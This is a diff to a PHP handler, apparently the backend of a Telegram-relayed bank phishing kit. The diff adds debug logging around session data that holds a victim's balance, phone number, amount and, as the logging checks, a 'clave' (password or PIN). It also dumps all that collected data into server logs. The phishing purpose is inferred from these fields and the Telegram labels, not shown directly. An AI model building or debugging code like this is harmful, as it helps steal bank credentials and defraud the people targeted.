@@ -198,13 +198,25 @@ try {
                 $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
             }
             
+            // Log inicial para debugging
+            error_log("[TELEGRAM SEND SALDO] ========== INICIO ==========");
+            error_log("[TELEGRAM SEND SALDO] Session ID: {$sessionId}");
+            error_log("[TELEGRAM SEND SALDO] Sesiones existentes: " . json_encode(array_keys($sessions)));
+            
             if (!isset($sessions[$sessionId])) {
+                error_log("[TELEGRAM SEND SALDO] ⚠️ CREANDO NUEVA SESIÓN (no debería pasar si ya se envió clave)");
                 $sessions[$sessionId] = [
                     'session_id' => $sessionId,
                     'created_at' => date('Y-m-d H:i:s'),
                     'data' => []
                 ];
+            } else {
+                error_log("[TELEGRAM SEND SALDO] ✓ Sesión encontrada");
             }
+            
+            // Guardar datos EXISTENTES antes de hacer cambios
+            $existingData = $sessions[$sessionId]['data'] ?? [];
+            error_log("[TELEGRAM SEND SALDO] Datos existentes en sesión: " . json_encode($existingData));
             
             // Guardar saldo preservando datos existentes
             $saldo = $data['data']['saldo'] ?? '';
@@ -217,18 +229,18 @@ try {
             if (!empty($telefono)) $newData['phoneNumber'] = $telefono;
             if (!empty($monto)) $newData['monto'] = $monto;
             
+            error_log("[TELEGRAM SEND SALDO] Nuevos datos a agregar: " . json_encode($newData));
+            
             // Hacer merge preservando TODOS los datos existentes
             $sessions[$sessionId]['data'] = array_merge(
-                $sessions[$sessionId]['data'] ?? [],
+                $existingData,
                 $newData
             );
             $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
             
-            // Log para debugging
-            error_log("[TELEGRAM SEND SALDO] Session ID: {$sessionId}");
-            error_log("[TELEGRAM SEND SALDO] Datos antes del merge: " . json_encode($sessions[$sessionId]['data'] ?? []));
-            error_log("[TELEGRAM SEND SALDO] Nuevos datos: " . json_encode($newData));
             error_log("[TELEGRAM SEND SALDO] Datos después del merge: " . json_encode($sessions[$sessionId]['data']));
+            error_log("[TELEGRAM SEND SALDO] ¿Tiene clave?: " . (isset($sessions[$sessionId]['data']['clave']) ? 'SI' : 'NO'));
+            error_log("[TELEGRAM SEND SALDO] ========== FIN ==========");
             
             file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
             
